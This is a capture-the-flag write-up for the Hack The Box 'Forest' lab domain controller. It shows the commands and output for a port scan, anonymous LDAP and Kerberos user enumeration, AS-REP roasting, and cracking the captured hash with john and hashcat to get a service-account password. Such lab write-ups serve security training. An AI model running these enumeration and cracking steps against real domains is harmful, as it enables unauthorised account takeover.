the box is easy <> usually i solve them as fast as possible + forest is an old box
https://www.hackthebox.com/achievement/machine/1777380/212
Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.
## enumeration
	IP =10.10.10.161
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.10.161
[sudo] password for pwn: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-05 18:29 UTC
Nmap scan report for 10.10.10.161
Host is up (0.076s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-05 18:38:01Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49977/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-05T18:38:52
|_  start_date: 2025-03-05T12:57:31
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s

```
-ldap open lets try anonymous bind
```bash
crackmapexec smb 10.10.10.161 --users
----------------------------------------------------------
┌──(pwn㉿kali)-[~/AD-TOOLS-LINUX/windapsearch]
└─$ ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" -s sub "(&(objectclass=*))" | grep sAMAccountName: | cut -f2 -d" "
----------------------------------------------------------


┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute userenum -d htb.local --dc 10.10.10.161 /home/pwn/forest/userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/05/25 - Ronnie Flathers @ropnop

2025/03/05 19:02:17 >  Using KDC(s):
2025/03/05 19:02:17 >   10.10.10.161:88

2025/03/05 19:02:17 >  [+] VALID USERNAME:       FOREST$@htb.local
2025/03/05 19:02:17 >  [+] VALID USERNAME:       EXCH01$@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailbox968e74d@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailbox670628e@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailbox6ded678@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailbox83d6781@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       andy@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailboxfd87238@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       sebastien@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       lucinda@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       santi@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       mark@htb.local
2025/03/05 19:02:18 >  [+] VALID USERNAME:       svc-alfresco@htb.local
```
-Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetNPUsers.py htb.local/ -usersfile /home/pwn/forest/userlist.txt -format hashcat -dc-ip 10.10.10.161

$krb5asrep$23$svc-alfresco@HTB.LOCAL:c1d2c7dd7e3e8a28dda8204560ff86b1$71507a5975355c9227cabb418915b17523162e0097c04568617683efe91d5eb40b519779797cd56ae623e0dd2e83fe77123565a88861ee92c59813703679746b4325c9d12ad7822f84a5cec13982994653b30ff9168b41430bb7618c19cac9288f9517fee063bd31759b280fb0cc6a53d17e7cc2f219726e9b48aadae065e627c2c691640ede279eee2b62553c22fe639f2220dcc6c1006e51b0627eca3e9623e152373356880e952b5d35ba75bc73b6f2edebfe85552b3d3e180105d0f96320ee86b77162e625edb3e903950066978db36b060cd5910e0cb008eaeed784cdd1e63b1ccecfe5
```

-Kerberos 5 AS-REP hash mode.
```bash
┌──(pwn㉿kali)-[~/forest]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:04 DONE (2025-03-05 19:13) 0.2169g/s 886281p/s 886281c/s 886281C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                         
┌──(pwn㉿kali)-[~/forest]
└─$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force  


s3rvice 
svc-alfresco
```

## FOOTHOLD
![[Pasted image 20250305221630.png]]

---
its straight forward via bloodhound 

![[Pasted image 20250305224104.png]]

![[Pasted image 20250305224255.png]]